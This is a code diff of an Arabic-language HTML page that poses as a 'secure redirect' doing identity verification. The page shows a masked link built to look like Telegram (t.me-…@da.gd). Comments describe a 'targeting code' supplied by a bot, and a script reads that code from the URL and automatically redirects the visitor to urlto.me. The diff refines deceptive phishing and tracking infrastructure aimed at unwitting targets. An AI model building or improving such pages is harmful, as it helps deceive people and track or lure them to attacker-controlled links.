@@ -5,28 +5,29 @@
     <title>جاري التحويل الآمن...</title>
     <style>
         body { font-family: sans-serif; text-align: center; padding-top: 100px; background-color: #f0f2f5; }
-        .mask-link { color: #0088cc; font-weight: bold; font-size: 18px; margin-top: 20px; }
+        .mask-card { background: white; padding: 20px; border-radius: 12px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .mask-link { color: #0088cc; font-weight: bold; font-size: 18px; margin-top: 20px; word-break: break-all; }
     </style>
 </head>
 <body>
-    <div style="padding: 20px; background: white; border-radius: 12px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+    <div class="mask-card">
         <p>جاري التحقق من الهوية عبر:</p>
         <div class="mask-link">https://t.me-Il_l_N@da.gd/OfWRV0</div>
-        <p id="status">يرجى الانتظار...</p>
+        <p id="status">يرجى الانتظار ثانية واحدة...</p>
     </div>
 
     <script>
-        // كود ذكي لقراءة "كود التعقب" من رابط الصفحة
+        // الكود البرمجي لقراءة "كود الاستهداف" المرسل من البوت
         const urlParams = new URLSearchParams(window.location.search);
-        const trackId = urlParams.get('id'); // سيقرأ الكود مثل 2D9K6
+        const targetID = urlParams.get('id'); 
 
-        if (trackId) {
+        if (targetID) {
             setTimeout(function() {
-                // سيقوم بالتحويل تلقائياً للرابط الذي تحدده من البوت
-                window.location.href = "https://urlto.me/" + trackId;
+                // سيقوم بالتحويل تلقائياً لـ urlto.me مع الكود المرسل
+                window.location.href = "https://urlto.me/" + targetID;
             }, 1500);
         } else {
-            document.getElementById('status').innerText = "خطأ: لم يتم تحديد كود الاستهداف.";
+            document.getElementById('status').innerText = "خطأ: لم يتم تحديد رابط استهداف.";
         }
     </script>
 </body>
